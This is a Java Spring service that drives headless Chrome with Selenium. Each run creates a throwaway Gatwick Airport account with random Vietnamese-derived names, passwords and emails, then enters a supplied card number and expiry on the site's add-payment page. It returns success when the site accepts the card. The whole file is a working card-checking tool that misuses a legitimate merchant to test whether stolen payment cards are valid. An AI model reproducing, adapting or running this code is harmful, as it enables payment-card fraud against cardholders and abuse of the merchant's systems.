package poly.edu.checked;

import java.security.SecureRandom;
import java.util.Random;
import java.util.concurrent.CompletableFuture;

import org.openqa.selenium.By;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.WebDriverException;
import org.openqa.selenium.WebElement;
import org.openqa.selenium.chrome.ChromeDriver;
import org.openqa.selenium.chrome.ChromeOptions;
import org.openqa.selenium.interactions.Actions;
import org.springframework.scheduling.annotation.Async;
import org.springframework.stereotype.Service;

import poly.edu.checked.Infomation.RandomVietnameseName;

@Service
public class SeleniumService {

    // @Autowired
    // private Executor seleniumTaskExecutor;

    @Async("seleniumTaskExecutor")
    public CompletableFuture<Boolean> executeSeleniumTask(String numberCard, String month, String year, String ccv) {
        // Khởi tạo trình duyệt Chrome với các tùy chọn đã cấu hình
        ChromeOptions options = new ChromeOptions();
        options.addArguments("--headless");
        options.addArguments("--window-size=1920,1080");
        options.addArguments("--incognito");
        options.setBinary("C:\\Tools\\CC\\Library\\Browser\\chromium\\exe\\chrome.exe");

        // Thiết lập đường dẫn đến trình duyệt ChromeDriver
        System.setProperty("webdriver.chrome.driver",
                "C:\\Tools\\CC\\Library\\Browser\\chromium\\driver\\chromedriver.exe");

                WebDriver driver = new ChromeDriver(options);
                boolean result;
                try {
                    result = Login(driver, numberCard, month, year, ccv);
                } catch (InterruptedException e) {
                    result = false;
                } finally {
                    driver.quit();
                }
        
                return CompletableFuture.completedFuture(result);
    }

    @SuppressWarnings({ "static-access", "unused" })
    public boolean Login(WebDriver driver, String username, String month, String year, String password)
            throws InterruptedException {
        int maxRetries = 3;
        Actions action = new Actions(driver);
        RandomVietnameseName rd = new RandomVietnameseName();

        sleep(1500);
        for (int retryCount = 0; retryCount < maxRetries; retryCount++) {
            try {
                driver.get("https://www.gatwickairport.com/passenger/account/login");
                WebElement acceptCookie = driver.findElement(By.id("onetrust-accept-btn-handler"));
                action.click(acceptCookie).perform();

                WebElement createAccount = driver.findElement(By.id("create-account"));
                action.click(createAccount).perform();

                sleep(1500);
                WebElement firstName = driver.findElement(By.id("registration-form-fname"));
                firstName.sendKeys(rd.getRandomFirstNameInter());

                WebElement lastName = driver.findElement(
                        By.cssSelector("input.form-control.font-family-vs-regular#registration-form-lname"));
                lastName.sendKeys(rd.getRandomLastNameInter());

                String pass = generateRandomPassword() + generateRandomPassword();
                WebElement txtPass = driver.findElement(By.id("passwordHints"));
                WebElement txtPassConfirm = driver.findElement(By.id("registration-form-password-confirm"));
                txtPass.sendKeys(pass);
                txtPassConfirm.sendKeys(pass);

                WebElement emails = driver.findElement(By.id("registration-form-email"));
                emails.sendKeys(generateRandomString() + "@gmail.com");
                WebElement check = driver.findElement(By.id("add-to-email-list"));
                action.click(check).perform();

                WebElement confirmPrivacyPolicy = driver.findElement(By.id("confirmPrivacyPolicy"));
                action.click(confirmPrivacyPolicy).perform();

                WebElement button = driver.findElement(By.id("create-account-button"));
                action.click(button).perform();
                sleep(1000);
                if (driver.getTitle().contains("502: Bad gateway")) {
                    sleep(500);
                    return false;
                }
                break;
            } catch (Exception e) {
                return false;
            }

        }
        sleep(5000);
        for (int retryCount = 0; retryCount < maxRetries; retryCount++) {
            try {
                driver.get(
                        "https://www.gatwickairport.com/on/demandware.store/Sites-Gatwick-Site/en_GB/PaymentInstruments-AddPayment");
                WebElement iframeCcv = driver
                        .findElement(By.cssSelector("iframe[title='Secure expiration date input frame']"));
                WebElement iframeCardNumber = driver
                        .findElement(By.cssSelector("iframe[title='Secure card number input frame']"));
                driver.switchTo().frame(iframeCardNumber);
                WebElement cardNumBer = driver.findElement(By.name("cardnumber"));
                cardNumBer.sendKeys(username);
                driver.switchTo().defaultContent();

                driver.switchTo().frame(iframeCcv);
                int number = Integer.valueOf(year);
                int result = number >= 100 ? number % 100 : number;
                WebElement exp_date = driver.findElement(By.name("exp-date"));
                exp_date.sendKeys(month + result);

                driver.switchTo().defaultContent();
                WebElement btnSave = driver.findElement(By.id("save-payment"));
                action.click(btnSave).perform();
                sleep(5000);
                sleep(5000);
                if (driver.getCurrentUrl().contains(
                        "https://www.gatwickairport.com/on/demandware.store/Sites-Gatwick-Site/en_GB/PaymentInstruments-List")) {
                    return true;
                } else {
                    try {
                        WebElement error = driver.findElement(By.id("card-errors"));
                        if (error != null) {
                            return false;
                        }
                    } catch (Exception e) {
                    }
                }
                break;
            } catch (WebDriverException e) {
                sleep(3000);
                System.out.println("Network error, retrying attempt " + (retryCount + 1));
            } catch (Exception e) {
                return false;
            }
            if (retryCount == maxRetries) {
                return false;
            }
        }

        return false;
    }

    public static String generateRandomString() {
        String characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
        SecureRandom random = new SecureRandom();
        StringBuilder sb = new StringBuilder(12);

        for (int i = 0; i < 12; i++) {
            int randomIndex = random.nextInt(characters.length());
            char randomChar = characters.charAt(randomIndex);
            sb.append(randomChar);
        }

        return sb.toString();
    }

    public static String generateRandomPassword() {

        String chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";

        Random random = new Random();

        StringBuilder password = new StringBuilder();

        for (int i = 0; i < 9; i++) {
            int index = random.nextInt(chars.length());
            password.append(chars.charAt(index));
        }

        return password.toString();

    }

    @SuppressWarnings("unused")
    private void sleep(long milliseconds) {
        try {
            Thread.sleep(milliseconds);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
    }
}
